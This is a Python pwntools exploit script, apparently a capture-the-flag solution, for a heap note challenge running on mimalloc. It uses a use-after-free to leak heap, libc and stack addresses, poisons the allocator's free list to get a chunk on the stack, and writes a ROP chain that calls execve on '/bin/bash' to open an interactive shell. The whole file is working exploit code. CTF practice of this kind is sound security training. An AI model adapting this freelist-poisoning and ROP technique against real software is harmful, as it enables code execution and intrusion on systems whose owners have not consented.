from pwn import *


binary = "./chal"
elf = context.binary = ELF(binary, checksec=False)

gs = """
break malloc
continue
"""

if args.REMOTE:
    p = remote("doremi.chal.uiuc.tf", 1337, ssl=True)
elif args.REMOTE2:
    p = remote("localhost", 1337)
elif args.GDB:
    context.terminal = ["tmux", "splitw", "-h", "-l", "65%"]
    p = gdb.debug(binary, gdbscript=gs, env={"LD_PRELOAD": "./libmimalloc.so.2.2"})
else:
    p = elf.process(env={"LD_PRELOAD": "./libmimalloc.so.2.2"})



### HELPER FUNCTIONS ###
def create(idx: int):
    if idx < 0 or idx > 15:
        raise ValueError("Index must be between 0 and 15")

    p.sendline(b'1')                # create
    p.sendline(str(idx).encode())   # idx
    p.recvuntil(b'YAHNC> ')

def read(idx: int) -> bytes:
    if idx < 0 or idx > 15:
        raise ValueError("Index must be between 0 and 15")
    
    p.sendline(b'3')                # read
    p.sendline(str(idx).encode())   # idx
    return p.recvuntil(b'YAHNC> ')[18:-14]

def write(idx: int, data: bytes, get_text=True):
    if idx < 0 or idx > 15:
        raise ValueError("Index must be between 0 and 15")
    
    p.sendline(b'4')                # write
    p.sendline(str(idx).encode())   # idx
    p.sendline(data)                # data
    if get_text:
        p.recvuntil(b'YAHNC> ')

def free(idx: int):
    if idx < 0 or idx > 15:
        raise ValueError("Index must be between 0 and 15")
    
    p.sendline(b'2')                # free
    p.sendline(str(idx).encode())   # idx
    p.recvuntil(b'YAHNC> ')



### SETUP ###
p.recvuntil(b'YAHNC> ')

# allocate (and keep) some chunks
create(7)
create(8)
create(4)
create(5)

# have a bunch of chunks "in the void"
for _ in range(26):
    create(15)



### GET HEAP LEAK ###
# create 2 chunks
create(0)
create(1)

# free both chunks
free(0)
free(1)

# get leak
heap_base = u64(read(1)[:8]) - 0x10f80
print(f"Heap base: {hex(heap_base)}")



### GET LIBC LEAK ###
# UAF - overwrite chunk 1 with some earlier metadata to get library leak
payload = flat(
    p64(heap_base + 0x1b8),
    p64(0),

    b'/bin/bash\x00',
    b'\x00'*0x64
)
write(1, payload)

# create 2 chunks
create(2)
create(3)

# read new chunks
lib_leak = u64(read(3)[8:16])
print(f'Lib leak: {hex(lib_leak)}')
libc_base = lib_leak + 0x7f00
print(f'Libc base: {hex(libc_base)}')



### GET STACK LEAK ###
free(7)
free(8)

# UAF - overwrite chunk 8 with libc address
payload = flat(
    p64(libc_base + 0xa2870),
    b'\x00'*0x76
)
write(8, payload)

# create 2 chunks
create(7)
create(8)

# read chunk 8 to get stack leak
stack_leak = u64(read(8)[8*3:8*4])
print(f'Stack leak: {hex(stack_leak)}')



### WRITE ROP CHAIN ###
free(4)
free(5)

# UAF - overwrite chunk 5 with stack address
payload = flat(
    p64(stack_leak-0xe0),
    b'\x00'*0x76
)
write(5, payload)

# create 2 chunks
create(4)
create(5)

# now, chunk 5 points to the stack
payload = flat(
    p64(libc_base + 0x14126)*8,         # retsled (to account for envar stack differences)

    p64(libc_base + 0x3d339),           # pop rax, ret
    p64(0x3b),                          # syscall number for execve

    p64(libc_base + 0x14413),           # pop rdi, ret
    p64(heap_base + 0x11010),           # pointer to "/bin/bash"

    p64(libc_base + 0x42774),           # pop rdx, ret
    p64(0),                             # rdx = NULL

    p64(libc_base + 0x4370d),           # xor esi, esi; syscall;
)
write(5, payload, get_text=False)


p.interactive()